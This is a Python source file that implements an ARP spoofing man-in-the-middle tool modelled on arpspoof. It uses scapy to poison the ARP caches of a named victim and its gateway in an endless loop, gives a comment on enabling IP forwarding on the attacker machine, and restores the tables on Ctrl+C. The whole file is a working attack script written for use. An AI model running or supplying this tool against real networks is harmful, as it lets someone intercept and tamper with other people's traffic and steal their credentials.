#!usr/bin/env python3

import argparse
import sys
import ipaddress
import scapy.all as scapy
import time

# Functionality like arpspoof tool
# On the attacker machine, enables IP forwarding by running from command line $echo 1 > /proc/sys/net/ipv4/ip_forward


# Function to get command-line arguments
def get_arguments():
    parser = argparse.ArgumentParser(description="Spoof ARP address (man in the middle)")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP")
    parser.add_argument("-g", "--gateway", required=True, help="Router/Gateway IP")
    args = parser.parse_args()

    # Validate IP
    if not validate_ip(args.victim):
        print(
            f"[ERROR] Invalid IP format: {args.victim}.")
        sys.exit(1)
    if not validate_ip(args.gateway):
        print(
            f"[ERROR] Invalid IP format: {args.gateway}.")
        sys.exit(1)

    return args

def validate_ip(ip):
    try:
        ipaddress.ip_network(ip, strict=True)
        return True
    except ValueError:
        return False


def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    except Exception as e:
        print(f"[ERROR] Failed to scan network: {e}")
        sys.exit(1)

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

if __name__ == "__main__":
    args = get_arguments()
    target_ip = args.victim # victim 10.1.1.4
    gateway_ip = args.gateway # router 10.1.1.1

    print("Start spoofing (man-in-the-middle) between victim=" + str(target_ip) + " and router=" + str(gateway_ip))
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print ("\r[+] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2) # sleep for 2 seconds
    except KeyboardInterrupt:
        print("\nDetected CTRL+C. Resetting ARP tables. Please wait..")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Restored.")
